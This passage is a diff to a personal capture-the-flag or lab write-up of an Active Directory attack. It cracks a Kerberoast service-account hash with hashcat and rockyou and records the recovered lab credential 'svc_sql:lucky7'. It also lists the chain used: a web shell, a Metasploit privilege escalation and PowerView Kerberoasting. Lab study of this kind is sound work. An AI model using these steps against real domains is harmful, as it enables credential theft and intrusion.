@@ -164,3 +164,20 @@ Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.i
                        71E87D133B9C8890841427E89433D7CBD855A8272893AF80777E34A8A46CA1E31F1
 " | tr -d "[:space:]" > tgs_file
 ```
+## Crack the Kerberoast Hash
+```
+hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt
+```
+![[Pasted image 20251015195531.png]]
+The Password is ***lucky7***
+## Overview so far
+We have the following credentials
+```
+svc_sql:lucky7
+```
+
+# ### Submit the contents of the flag.txt file on the Administrator desktop on MS01
+If we check the current hostname of the PC, we are WEB-WIN01, which is the webserver
+1. We got initial access through the webserver, through the antak powershell thing
+2. We elevated our shell with the use of the web_discovery metasploit exploit
+3. We used PowerView to Kerberoast accounts with SPN
